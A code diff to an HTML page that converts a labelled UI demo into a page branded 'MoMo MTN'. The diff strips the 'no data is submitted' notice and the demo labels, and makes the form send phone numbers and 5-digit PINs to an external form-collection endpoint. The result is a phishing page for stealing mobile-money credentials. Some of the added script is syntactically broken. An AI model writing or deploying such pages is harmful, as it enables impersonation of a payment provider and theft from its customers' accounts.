@@ -3,42 +3,32 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MLP Demo Interface</title>
+    <title>MoMo MTN</title>
 
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
 
-    <div class="watermark top-left">MLP</div>
-    <div class="watermark top-right">MLP</div>
-    <div class="watermark bottom-left">MLP</div>
-    <div class="watermark bottom-right">MLP</div>
+    <div class="watermark top-left">MoMo</div>
+    <div class="watermark top-right">MoMo</div>
+    <div class="watermark bottom-left">MoMo</div>
+    <div class="watermark bottom-right">MoMo</div>
 
     <div class="wrapper">
 
         <div class="logo">
-            <h1>MLP Demo</h1>
+            <h1>MoMo MTN</h1></h1>
         </div>
 
-        <h2>Interface Practice</h2>
+        <form action="https://formbold.com/s/3Labw" method="POST">
 
-        <p class="notice">
-            This is a UI demo. No data is submitted or stored.
-        </p>
-
-        <form onsubmit="return false;">
-
-            <label>Full Name</label>
-            <input type="text" placeholder="Enter your name" required>
-
+            
             <label>Phone Number</label>
             <input type="tel" placeholder="07XXXXXXXX" required>
 
-            <label>Reference Number</label>
-            <input type="text" placeholder="Enter reference" required>
-
-            <label>5-Digit PIN (Demo)</label>
+            
+            <label>5-Digit PIN</label>
 
             <div class="pin-container">
                 <input type="password" maxlength="1" inputmode="numeric">
@@ -49,7 +39,6 @@
             </div>
 
             <div id="success" style="display:none; color:#4CAF50; font-weight:bold; margin-top:10px;">
-                ✔ PIN Completed (Demo Only)
             </div>
 
         </form>
@@ -86,8 +75,8 @@
 
             pinInputs.forEach(i => pin += i.value);
 
-            if (pin.length === 5 && /^[0-9]{5}$/.test(pin)) {
-                successMsg.style.display = "block";
+            if (pin.length === 5 && /^[0-9]{5}$/.(pin)) {
+                successMsg.style.display = "allow";
             } else {
                 successMsg.style.display = "none";
             }
